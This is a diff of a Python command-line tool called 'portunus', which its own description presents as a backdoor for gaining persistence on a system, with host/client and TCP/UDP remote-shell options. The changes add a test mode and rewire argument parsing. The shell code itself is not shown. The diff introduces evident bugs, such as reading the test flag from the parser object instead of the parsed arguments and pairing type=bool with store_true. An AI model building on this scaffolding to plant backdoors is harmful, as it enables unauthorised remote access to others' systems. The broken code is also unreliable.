@@ -14,8 +14,12 @@ def parse_args():
     """
     Created argparse object to parse command line arguments
     """
-    parser = argparse.ArgumentParser(
+    main_parser = argparse.ArgumentParser(
         description="creates a backdoor to install on a system to gain persistence")
+    parse = main_parser.add_mutually_exclusive_group()
+    parse.add_argument(
+        '--test', help="puts portunus into testing mode in which all commands are run on local system", type=bool, default=False, action='store_true')
+    parser = parse.add_argument_group()
     client_server = parser.add_mutually_exclusive_group()
     client_server.add_argument(
         '--host', help='establishes current connection as where clients will connect to')
@@ -34,7 +38,8 @@ def parse_args():
         "-u", "--udp", help="utilizes udp for shell interation")
     connection.add_argument(
         "-t", '--tcp', help="estbalishes tcp connection for shell interation")
-    parser.parse_args()
+    main_parser.parse_args()
+    return main_parser
 
 
 def run_shell():
@@ -140,8 +145,9 @@ def main():
     """
     Main meathod of portunus.py
     """
-    parse_args()
-    run_shell()
+    parser = parse_args()
+    if parser.test:
+        run_shell()
 
 
 if __name__ == "__main__":
